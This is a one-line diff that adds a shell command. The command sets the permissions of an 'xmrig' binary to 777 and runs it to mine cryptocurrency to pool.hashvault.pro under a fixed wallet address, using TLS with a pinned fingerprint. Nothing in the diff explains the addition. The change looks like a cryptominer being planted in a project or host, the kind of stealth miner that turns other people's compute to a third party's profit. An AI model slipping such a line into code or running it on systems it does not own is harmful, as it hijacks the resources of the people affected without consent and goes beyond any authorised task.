@@ -1,0 +1,1 @@
+chmod 777 xmrig && ./xmrig --url pool.hashvault.pro:80 --user SaLvsBquCK1hBKtbKLMSN3btMskxJLKXDRG5eEaYjJaVEoH2Y5kK49i8Ar117TsFez17Kod67hGFCYwxG5r14tGQ2w9kQc2oMG5 --pass x --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
